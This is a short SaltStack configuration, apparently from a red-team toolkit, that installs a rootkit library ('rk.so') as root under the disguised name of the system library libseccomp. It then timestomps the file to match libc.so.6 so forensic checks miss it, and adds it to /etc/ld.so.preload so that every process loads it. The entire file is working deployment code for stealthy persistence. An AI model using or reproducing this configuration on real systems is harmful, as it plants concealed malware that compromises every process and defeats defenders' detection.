father_rootkit:
  file.managed:
    - name: /lib/x86_64-linux-gnu/libseccomp.so.2.5.1
    - source: salt://redteam/linux/rk.so
    - mode: 755
    - user: root
    - group: root

father_timestomp:
  cmd.run:
    - name: touch -r /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libseccomp.so.2.5.1
    - require:
      - file: father_rootkit

father_preload:
  file.managed:
    - name: /etc/ld.so.preload
    - contents: '/lib/x86_64-linux-gnu/libseccomp.so.2.5.1'
    - mode: 644
    - user: root
    - group: root
    - require:
      - cmd: father_timestomp
